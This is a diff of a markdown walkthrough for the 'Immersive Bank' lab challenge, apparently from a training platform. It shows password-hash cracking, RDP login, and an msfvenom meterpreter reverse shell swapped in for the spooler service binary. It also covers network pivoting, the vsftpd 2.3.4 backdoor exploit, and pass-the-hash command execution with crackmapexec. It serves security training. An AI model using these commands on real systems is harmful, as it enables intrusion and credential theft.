@@ -13,6 +13,7 @@ description: "Immersive Bank - A walkthrough of the challenge with enumeration, 
 # IML - Immersive Bank
 
 **<u>Immersive Bank: Ep.1 – Open Source and Credentials</u>**
+
 ```bash
 john hash /usr/share/wordlists/rockyou.txt --format=raw-sha256S
 
@@ -24,6 +25,7 @@ john hash /usr/share/wordlists/rockyou.txt --format=raw-sha256S
 ![image2](../resources/ff8b07f220184b248f67c606e02f9cb2.png)
 
 **<u>Immersive Bank: Ep. 2 – Gaining Access</u>**
+
 ```bash
 xfreerdp /v:10.102.189.120:8877 /u:carlof /p:manunited +clipboard +drives /drive:root,/home/kali /dynamic-resolution /cert:ignore
 
@@ -32,6 +34,7 @@ xfreerdp /v:10.102.189.120:8877 /u:carlof /p:manunited +clipboard +drives /drive
 ![image3](../resources/cb678f99260b4d77a1dab3ca4c44216b.png)
 
 **<u>Immersive Bank: Ep.3 – Privilege Escalation</u>**
+
 ```bash
 xfreerdp /v:10.102.118.107:8877 /u:carlof /p:manunited +clipboard +drives /drive:root,/home/kali /dynamic-resolution /cert:ignore
 
@@ -51,12 +54,14 @@ sc query spooler
 
 ![image6](../resources/ac759a27b55043848b971c7a027f940f.png)
 
-- Create a reverse shell named spoolsv.exe
+- Create a reverse shell named spoolsv.exe:
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.102.170.0 LPORT=4445 -f exe -o spoolsv.exe
 
 ```
-- Set up listener
+- Set up listener:
+
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.102.170.0; set lport 4445; exploit"
 
@@ -64,6 +69,7 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 - Transfer the malicious exe and replace the original
 
 - Start service:
+
 ```bash
 sc start spooler
 
@@ -72,6 +78,7 @@ sc start spooler
 ![image7](../resources/2932eb0ce39f4c62b97c6bff51ff6b1d.png)
 
 - Migrate to a more stable process:
+
 ```bash
 ps
 
@@ -105,6 +112,7 @@ xfreerdp /v:10.102.146.57:8877 /u:carlof /p:manunited +clipboard +drives /drive:
 ![image11](../resources/afcfabd38ef1469f974786de9ca2124e.png)
 
 - Now we need to add a route to the FTP server:
+
 ```bash
 route add 10.102.36.63 255.255.255.255 1
 
@@ -113,11 +121,13 @@ route add 10.102.36.63 255.255.255.255 1
 ![image12](../resources/52f0db74f48147e98ec6c4a5ea0746fc.png)
 
 - Back to the session:
+
 ```bash
 sessions 1
 
 ```
 - Forward port 3000 on our localhost to port 21 on the FTP server:
+
 ```bash
 portfwd add -l 3000 -p 21 -r 10.102.36.63
 
@@ -140,11 +150,13 @@ nc 127.0.0.1 3000
 ![image15](../resources/d7f7f68f0c37441085fbbe2a0edcfe70.png)
 
 - Background current meterpreter session:
+
 ```bash
 bg
 ```
 
 - Search for vsftpd in msf and use the following payload:
+
 ```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
 set rhosts 10.102.36.63  #Because route was added
@@ -167,6 +179,7 @@ set rport 21
 manager:1002:aad3b435b51404eeaad3b435b51404ee:**66ece2b7200f29cbd0b799350c29244e**:::
 
 - We can check the credentials with CME:
+
 ```bash
 crackmapexec smb 10.102.154.232 -u manager -H 66ece2b7200f29cbd0b799350c29244e
 
@@ -175,6 +188,7 @@ crackmapexec smb 10.102.154.232 -u manager -H 66ece2b7200f29cbd0b799350c29244e
 ![image19](../resources/a31d5f5b29d745d1a259b508479988a7.png)
 
 - We can also execute commands through CME:
+
 ```bash
 crackmapexec smb 10.102.154.232 -u manager -H 66ece2b7200f29cbd0b799350c29244e -x 'type C:\Users\manager\Desktop\token.txt'
 
